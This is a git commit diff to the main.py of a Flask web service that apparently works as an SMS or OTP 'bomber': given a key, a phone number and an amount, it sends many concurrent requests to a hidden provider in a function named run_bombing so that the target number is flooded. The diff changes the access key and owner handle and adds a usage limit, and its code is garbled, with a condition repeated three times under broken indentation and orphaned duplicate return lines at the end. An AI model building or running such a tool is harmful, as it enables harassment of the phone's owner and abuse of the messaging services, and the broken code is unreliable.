0c1f53725ef6cd07d4281a90c37e887d389cba29
accfortry380-dev <accfortry380@gmail.com>
2026-05-01 21:03:34 +0600

    Update main.py

--- main.py
+++ main.py
@@ -5,7 +5,10 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 # SECURITY KEY: Kew link peleo eita chara hit korte parbe na
-SECRET_KEY = "sunny_private_786" 
+# top e add koro
+key_usage = {}
+MAX_LIMIT = 10
+SECRET_KEY = "RASHIK_VY" 
 
 async def hit_service(session, phone):
     # Provider name hidden
@@ -30,10 +33,61 @@ def server_api():
 
     # 1. Access Protection
     if key != SECRET_KEY:
-        return jsonify({"error": "Unauthorized Access!", "owner": "@sunny7695"}), 403
+        return jsonify({"error": "Unauthorized Access!", "owner": "@RASHIK_69"}), 403
+    
+    if key not in key_usage:
+    key_usage[key] = 0
+
+if key not in key_usage:
+    key_usage[key] = 0
+
+if key not in key_usage:
+        key_usage[key] = 0
+
+    if key_usage[key] >= MAX_LIMIT:
+        return jsonify({
+            "success": False,
+            "msg": "This key limit exceeded",
+            "limit": MAX_LIMIT,
+            "used": key_usage[key],
+            "remaining": 0,
+            "credit": "@RASHIK_69"
+        }), 429
+
+    key_usage[key] += 1
 
     # 2. Maximum Amount Limit (Strict 10)
     if amount > 10:
+        return jsonify({"status": "failed", "msg": "Max amount is 10"}), 400
+
+    if not phone or len(phone) < 10:
+        return jsonify({"status": "failed", "msg": "Invalid Number"}), 400
+
+    # 3. High Speed Async Execution
+    async def run_bombing():
+        async with aiohttp.ClientSession() as session:
+            tasks = [hit_service(session, phone) for _ in range(amount)]
+            return await asyncio.gather(*tasks)
+
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(run_bombing())
+    loop.close()
+
+    return jsonify({
+    "success": True,
+    "target": phone,
+    "hits": amount,
+    "used": key_usage[key],
+    "remaining": MAX_LIMIT - key_usage[key],
+    "limit": MAX_LIMIT,
+    "credit": "@RASHIK_69",
+    "status": "Active!"
+})
+
+# Vercel handling
+def handler(event, context):
+    return app(event, context)
         return jsonify({"status": "failed", "msg": "Max amount is 10"}), 400
 
     if not phone or len(phone) < 10:
